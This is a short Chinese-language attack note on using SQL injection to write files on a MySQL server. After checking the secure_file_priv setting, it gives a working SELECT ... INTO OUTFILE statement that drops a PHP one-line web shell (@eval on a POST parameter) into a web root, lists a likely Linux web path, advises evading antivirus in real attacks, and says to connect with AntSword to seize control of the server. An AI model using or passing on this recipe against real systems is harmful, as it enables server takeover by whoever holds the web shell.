# 文件注入

1. ```sql
   SHOW VARIABLES LIKE '%secure%'
   ```

2. 查看是否具有文件写入权限：

   | Variable_name            | Value |
   | ------------------------ | ----- |
   | require_secure_transport | OFF   |
   | secure_auth              | ON    |
   | secure_file_priv         | NULL  |

3. 主要关注 secure_file_priv，priv 即 privilege，这是一个用于指定数据库服务器上允许执行LOAD DATA INFILE和LOAD XML语句时的文件路径限制的系统变量。如果设置了这个变量，那么只有在指定路径下的文件才能被加载。当前情况下，它被设置为NULL，这意味着没有明确指定的路径限制，任何地方的文件都**不**可以被加载。测试时需要在 my.ini 中配置 secure_file_priv="" 空，才能使任意地方文件都可以加载。

4. 注入木马

5. ```sql
   select 1,2,'<?php @eval($_POST["nanamo"])?>' into outfile "C:\\phpstudy_pro\\WWW\\hackin.php"
   ```

6. Linux 服务器 可能的路径："/var/www/html/test/"

7. 实战时需要考虑绕过木马检测，这种一句话木马很快就会被 windows 自带杀毒软件杀掉

8. 用 antsword 连接，获取服务器控制权

